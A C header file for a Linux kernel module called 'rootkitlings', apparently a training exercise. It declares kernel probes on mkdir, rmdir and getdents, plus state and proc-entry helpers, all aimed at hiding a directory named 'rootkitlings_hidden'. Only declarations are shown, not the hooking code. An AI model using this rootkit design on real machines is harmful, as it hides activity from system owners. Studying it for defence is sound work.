// SPDX-License-Identifier: GPL-2.0
#ifndef ROOTKITLINGS_ROOTKIT_H
#define ROOTKITLINGS_ROOTKIT_H

#include <linux/compiler_attributes.h>
#include <linux/types.h>

#define RK_FAIL_NONE 0
#define RK_FAIL_PREFLIGHT 1
#define RK_FAIL_STATE_ALLOC 2
#define RK_FAIL_PROC_PUBLISH 3
#define RK_FAIL_SECOND_PROBE 4
#define RK_FAIL_ITERATE_PROBE 5
#define RK_FAIL_HIDDEN_PUBLISH 6

#define RK_DIRECTORY_CHUNK_CAPACITY (32U * 1024U)
#define RK_DIRECTORY_TARGET "rootkitlings_hidden"
#define RK_DIRECTORY_RETURN_CAPACITY 16

struct rk_state;

enum rk_probe_id {
	RK_PROBE_VFS_MKDIR,
	RK_PROBE_FILENAME_RMDIR,
	RK_PROBE_COUNT,
};

__must_check struct rk_state *rk_state_create(void);
bool rk_state_is_active(const struct rk_state *state);
bool rk_state_actions_enabled(const struct rk_state *state);
void rk_state_set_actions_enabled(struct rk_state *state, bool enabled);
bool rk_state_vfs_mkdir_seen(const struct rk_state *state);
void rk_state_mark_vfs_mkdir_seen(struct rk_state *state);
bool rk_state_filename_rmdir_seen(const struct rk_state *state);
void rk_state_mark_filename_rmdir_seen(struct rk_state *state);
void rk_state_destroy(struct rk_state *state);

__must_check int rk_proc_publish(struct rk_state *state);
void rk_proc_unpublish(void);

__must_check int rk_hidden_proc_publish(void);
void rk_hidden_proc_unpublish(void);

__must_check int rk_probes_start(struct rk_state *state);
void rk_probes_stop(void);
const char *rk_probe_name(enum rk_probe_id id);

__must_check int rk_getdents_probe_start(struct rk_state *state);
void rk_getdents_probe_stop(void);
unsigned int rk_getdents_probe_missed(void);

#endif
